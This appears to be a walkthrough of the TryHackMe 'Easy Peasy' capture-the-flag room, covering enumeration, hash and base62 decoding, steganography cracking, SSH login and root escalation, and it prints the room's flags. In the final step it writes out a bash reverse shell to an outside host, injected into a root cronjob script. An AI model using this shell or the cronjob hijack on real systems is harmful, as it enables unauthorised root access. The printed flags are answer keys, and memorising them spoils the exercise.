<html>

<head>

<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:8.0pt;
	margin-left:0cm;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
	{color:#0563C1;
	text-decoration:underline;}
pre
	{mso-style-link:"HTML Preformatted Char";
	margin:0cm;
	margin-bottom:.0001pt;
	font-size:10.0pt;
	font-family:"Courier New";}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:8.0pt;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:8.0pt;
	margin-left:36.0pt;
	line-height:107%;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
span.HTMLPreformattedChar
	{mso-style-name:"HTML Preformatted Char";
	mso-style-link:"HTML Preformatted";
	font-family:"Courier New";}
.MsoChpDefault
	{font-family:"Calibri",sans-serif;}
.MsoPapDefault
	{margin-bottom:8.0pt;
	line-height:107%;}
 /* Page Definitions */
 @page WordSection1
	{size:612.0pt 792.0pt;
	margin:72.0pt 72.0pt 72.0pt 72.0pt;}
div.WordSection1
	{page:WordSection1;}
 /* List Definitions */
 ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>

</head>



<div class=WordSection1>

<p class=MsoNormal><b>Run nmap scan for port and service scanning</b></p>

<p class=MsoNormal><b>Nmap -p- 10.10.8.182</b></p>

<p class=MsoNormal><b>Nmap -sCV 10.10.8.182</b></p>

<p class=MsoNormal><b><img width=624 height=183 id="Picture 3"
src="easyPeasy_workthrough_files/image001.png"></b></p>

<p class=MsoNormal><b><img width=624 height=225 id="Picture 1"
src="easyPeasy_workthrough_files/image002.png"></b></p>

<p class=MsoListParagraph><b>&nbsp;</b></p>

<p class=MsoNormal><b>Hit on the web browser with the highest port , and got
the service is Apache</b></p>

<p class=MsoNormal><b><img width=624 height=145 id="Picture 4"
src="easyPeasy_workthrough_files/image003.jpg"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>THM questions: </b><b><span style='font-family:"Arial",sans-serif;
color:#F9F9FB;background:#212C42'>Enumeration through Nmap</span></b></p>

<p class=MsoNormal><b><img width=623 height=263 id="Picture 5"
src="easyPeasy_workthrough_files/image004.jpg"></b></p>

<p class=MsoNormal><b>Download the given file and sort it </b></p>

<p class=MsoNormal><b><img width=624 height=334 id="Picture 23"
src="easyPeasy_workthrough_files/image005.png"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>For Question 1: </b></p>

<p class=MsoNormal><b>Using gobuster to find out the directory List</b></p>

<p class=MsoNormal><b><img width=624 height=312 id="Picture 6"
src="easyPeasy_workthrough_files/image006.jpg"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>Using gobuster to find out the directory under the hidden
directory</b></p>

<p class=MsoNormal><b><img width=624 height=360 id="Picture 14"
src="easyPeasy_workthrough_files/image007.jpg"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>View the page source of recently found page and using
cyberchef to find out the flag 1</b></p>

<p class=MsoNormal><b><img width=624 height=311 id="Picture 12"
src="easyPeasy_workthrough_files/image008.jpg"></b></p>

<p class=MsoNormal><b><img width=624 height=234 id="Picture 13"
src="easyPeasy_workthrough_files/image009.jpg"></b></p>

<p class=MsoNormal><b> Flag 1: flag{f1rs7_fl4g}</b></p>

<p class=MsoNormal><img width=624 height=55 id="Picture 33"
src="easyPeasy_workthrough_files/image010.jpg"></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>For question 2: </b></p>

<p class=MsoNormal><b>Visit </b><a href="http://10.10.132.149:65524/robots.txt"><b>http://10.10.132.149:65524/robots.txt</b></a><b>
and found a hash value</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=169 id="Picture 32"
src="easyPeasy_workthrough_files/image011.jpg"></b></p>

<p class=MsoNormal><b><span style='font-size:10.0pt;line-height:107%;
font-family:"Courier New"'>a18672860d0510e5ab6699730763b250</span></b></p>

<p class=MsoNormal><b>Now go to this site </b><a href="https://md5hashing.net/"><b>https://md5hashing.net/</b></a><b>
dycrypt the hash value </b></p>

<p class=MsoNormal><b><img border=0 width=624 height=102 id="Picture 17"
src="easyPeasy_workthrough_files/image012.jpg"></b></p>

<p class=MsoNormal><b>flag{1m_s3c0nd_fl4g}</b></p>

<p class=MsoNormal><img border=0 width=624 height=56 id="Picture 34"
src="easyPeasy_workthrough_files/image013.jpg"></p>

<p class=MsoNormal><b>For question 3:</b></p>

<p class=MsoNormal><b>On the 10.10.132.149:65524 page view source found the
flag 3</b></p>

<p class=MsoNormal><b><img border=0 width=623 height=153 id="Picture 16"
src="easyPeasy_workthrough_files/image014.jpg"></b></p>

<pre><b>Flag 3: lag{9fdafbd64c47471a8f54cd3fc64cd312}</b></pre><pre><b>&nbsp;</b></pre><pre><img
border=0 width=624 height=59 id="Picture 35"
src="easyPeasy_workthrough_files/image015.jpg"></pre>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>For question 4:</b></p>

<p class=MsoNormal><b>On the 10.10.132.149:65524 page view source found the
hidden tag and a hash starting with ba….. </b></p>

<p class=MsoNormal><b><img border=0 width=624 height=224 id="Picture 7"
src="easyPeasy_workthrough_files/image016.jpg"></b></p>

<p class=MsoNormal><b>Here mention ba.. value so we try all base decoder. Using
cyberchef we can crack the base62 value </b></p>

<p class=MsoNormal><b><img border=0 width=624 height=280 id="Picture 8"
src="easyPeasy_workthrough_files/image017.jpg"></b></p>

<p class=MsoNormal><b>10.10.132.149:65524/n0th1ng3ls3m4tt3r</b></p>

<p class=MsoNormal><img border=0 width=624 height=52 id="Picture 36"
src="easyPeasy_workthrough_files/image018.jpg"></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>For question 5:</b></p>

<p class=MsoNormal><b>View source of  10.10.132.149:65524/n0th1ng3ls3m4tt3r/ 
and get a hash value</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=303 id="Picture 9"
src="easyPeasy_workthrough_files/image019.jpg"></b></p>

<p class=MsoNormal style='margin-bottom:0cm;line-height:normal'><b><span
style='font-size:10.0pt;font-family:"Courier New"'>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</span></b></p>

<p class=MsoNormal><b><img border=0 width=624 height=73 id="Picture 15"
src="easyPeasy_workthrough_files/image020.jpg"></b></p>

<p class=MsoNormal><b>Using john tool try to crack the password </b></p>

<p class=MsoNormal><b><img border=0 width=624 height=245 id="Picture 2"
src="easyPeasy_workthrough_files/image021.jpg"></b></p>

<p class=MsoNormal><img border=0 width=624 height=65 id="Picture 37"
src="easyPeasy_workthrough_files/image022.jpg"></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>For Question 6:</b></p>

<p class=MsoNormal><b>View source of  10.10.132.149:65524/n0th1ng3ls3m4tt3r/ 
and Download the image </b></p>

<p class=MsoNormal><b><img border=0 width=614 height=227 id="Picture 19"
src="easyPeasy_workthrough_files/image023.jpg"></b></p>

<p class=MsoNormal><b>Try to get information about the image by steghide tool
but need a passphrease</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=207 id="Picture 18"
src="easyPeasy_workthrough_files/image024.jpg"></b></p>

<p class=MsoNormal><b>Crack the image by stegcracer tool using the given
password file, </b></p>

<p class=MsoNormal><b><img border=0 width=624 height=261 id="Picture 20"
src="easyPeasy_workthrough_files/image025.jpg"></b></p>

<p class=MsoNormal><b>and get the extract information in to file called
easypeasy.jpeg.out</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=309 id="Picture 21"
src="easyPeasy_workthrough_files/image026.jpg"></b></p>

<p class=MsoNormal><b>Convert it from binary to decimal</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=233 id="Picture 24"
src="easyPeasy_workthrough_files/image027.jpg"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>Try to connect via SSH with port 6498</b></p>

<p class=MsoNormal><b>Username: boring</b></p>

<p class=MsoNormal><b>Password: iconvertedmypasswordtobinary</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b><img border=0 width=625 height=404 id="Picture 25"
src="easyPeasy_workthrough_files/image028.jpg"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><img border=0 width=624 height=51 id="Picture 38"
src="easyPeasy_workthrough_files/image029.jpg"></p>

<p class=MsoNormal><b>For Question 7: </b></p>

<p class=MsoNormal><b>Found a file called user.txt but cant get the flag , It
seems the encrypted. There is a hinted mentioning Rotated.</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=122 id="Picture 26"
src="easyPeasy_workthrough_files/image030.jpg"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>Decoded it with cyberchef   root13 decoder 
flag{n0wits33msn0rm4l}</b></p>

<p class=MsoNormal><b><img border=0 width=625 height=255 id="Picture 31"
src="easyPeasy_workthrough_files/image031.jpg"></b></p>

<p class=MsoNormal><img border=0 width=624 height=57 id="Picture 40"
src="easyPeasy_workthrough_files/image032.png"></p>

<p class=MsoNormal><b>For Qustion 8:</b></p>

<p class=MsoNormal><b>As mention on the room task there must be a cronjob
running</b></p>

<p class=MsoNormal><img border=0 width=625 height=71 id="Picture 41"
src="easyPeasy_workthrough_files/image033.jpg"></p>

<p class=MsoNormal><b>Found a cronjob is running  named .mysecrectcronjob.sh</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=211 id="Picture 27"
src="easyPeasy_workthrough_files/image034.jpg"></b></p>

<p class=MsoNormal><b>Open this file with editor and add this line for access a
reverse shell.</b></p>

<p class=MsoNormal><b><span style='font-size:10.5pt;line-height:107%;
font-family:"Courier New";color:#242424;letter-spacing:-.25pt;background:#F9F9F9'>bash
-i &gt;&amp; /dev/tcp/10.10.8.87/4444 0&gt;&amp;1</span></b></p>

<p class=MsoNormal><b><img border=0 width=624 height=129 id="Picture 28"
src="easyPeasy_workthrough_files/image035.jpg"></b></p>

<p class=MsoNormal><b>Run listening port on my local machine and access that machine
as root user</b></p>

<p class=MsoNormal><b><img border=0 width=625 height=151 id="Picture 29"
src="easyPeasy_workthrough_files/image036.jpg"></b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>Then fond the hidden file .root.txt at the root user home
directory and there found the last flag</b></p>

<p class=MsoNormal><b><img border=0 width=624 height=85 id="Picture 30"
src="easyPeasy_workthrough_files/image037.jpg"></b></p>

<p class=MsoNormal><b>flag{63a9f0ea7bb98050796b649e85481845}</b></p>

<p class=MsoNormal><img border=0 width=625 height=58 id="Picture 42"
src="easyPeasy_workthrough_files/image038.jpg"></p>

<p class=MsoNormal><b>&nbsp;</b></p>

<p class=MsoNormal><b>&nbsp;</b></p>

</div>



</html>
